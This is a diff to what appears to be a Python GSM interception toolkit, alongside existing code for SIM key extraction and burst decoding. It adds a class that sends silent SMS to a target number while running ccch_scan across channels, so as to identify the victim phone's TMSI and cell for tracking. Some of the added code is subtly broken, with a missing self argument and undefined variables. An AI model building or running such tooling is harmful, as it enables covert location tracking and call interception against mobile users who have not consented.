@@ -1,12 +1,15 @@
 #!/usr/bin/python
 
 import telnetlib
+import pexpect
 import subprocess
 import re
 import random
 import io
 import sys
 import os, fcntl, fcntl, termios, termios
+import operator
+import heapq
 
 from lxml import etree
 from lxml import objectify
@@ -17,6 +20,8 @@ from card.SIM import SIM
 from jinja2 import Template
 
 from time import sleep
+
+from najdisisms import NajdiSiSms
 
 class capturedecode(object):
     def SmartCardGetKcFromRand(self, rand, pin=None):
@@ -115,6 +120,96 @@ class capturedecode(object):
 
             print "Decoded bursts", result
             print c.DecodeData(kc)
+
+class NajdiSiSms_gsm(object):
+    def __init__(self,username, password):
+        self.username= username
+        self.password= password
+        self.sender= NajdiSiSms()
+
+    def send(number, silent):
+        self.sender.send_sms(username,password,number,"test")
+
+class findtmsi(object):
+    """
+    Finds tmsi using ccch_scan on different arfcns by looking which mobile
+    phone respondes in a given time when silent sms is sent.
+    """
+
+    def Scan(self):
+        max_occurenc=0
+        max_tmsi=""
+        max_arfcn=0
+        for arfcn in self.arfcns:
+            print "Scanning arfcn:", arfcn
+            (c,c2,t)=self.ScanArfcn(arfcn)
+            print "Current max occurences is %d, and second max occurence is %d, with tmsi %s"% (c, c2,t)
+            if c>max_occurenc:
+                max_occurenc= c
+                max_tmsi=t
+                max_arfcn=arfcn
+            if c-c2>=2:
+                print "This shurely is target tmsi and it's arfcn"
+                break
+
+        print( "Max occurences is %d, with tmsi %s on arfcn %d"% 
+                (max_occurenc, max_tmsi, max_arfcn) )
+        return (max_tmsi, max_arfcn)
+
+    def ScanArfcn(self, arfcn):
+        last_tmsi={}
+        last_tmsi_index=0
+        best_tmsi={}
+        send_sms=True
+
+        tmsi_count=0
+        immass_count=0
+
+        p=pexpect.spawn("./ccch_scan -s %s -a %d -i 127.0.0.1" % (self.socket, arfcn),
+                timeout=400)
+        while(True):
+            i=p.expect(["GSM48 IMM ASS","M\((\d+)\)"])
+
+            if(i==0):
+                print "Immass found"
+                print last_tmsi.values()
+                for id in last_tmsi.keys():
+                    if last_tmsi[id] not in best_tmsi.keys():
+                        best_tmsi[last_tmsi[id]]=0
+                    best_tmsi[last_tmsi[id]]+=1
+                last_tmsi={}
+                tmsi_count=0
+                immass_count+=1
+
+                send_sms= True
+            if(i==1):
+                if p.match.group(1) not in last_tmsi:
+                    last_tmsi[last_tmsi_index]=p.match.group(1)
+                    tmsi_count+=1
+
+                    if last_tmsi_index>=9:
+                        last_tmsi_index=0
+
+                    last_tmsi_index+=1
+
+            if send_sms and self.sms_sender:
+                self.sms_sender.send(number, silent=True)
+                send_sms= False
+
+            if immass_count>=self.immass_count:
+                break
+
+        print max(best_tmsi.values())
+        print heapq.nlargest(2, best_tmsi.values())[1]
+        return (max(best_tmsi.values()), heapq.nlargest(2, best_tmsi.values())[1],
+                max(best_tmsi.iteritems(), key=operator.itemgetter(1))[0])
+
+    def __init__(self, arfcns, immass_count=60, socket="/tmp/osmocom_l2_1", sms_sender=None, number=None):
+        self.arfcns= arfcns
+        self.number= number
+        self.socket= socket
+        self.sms_sender= sms_sender
+        self.immass_count= immass_count
 
 class gsmcrack(object):
     def ErrorRate( self, ul ):
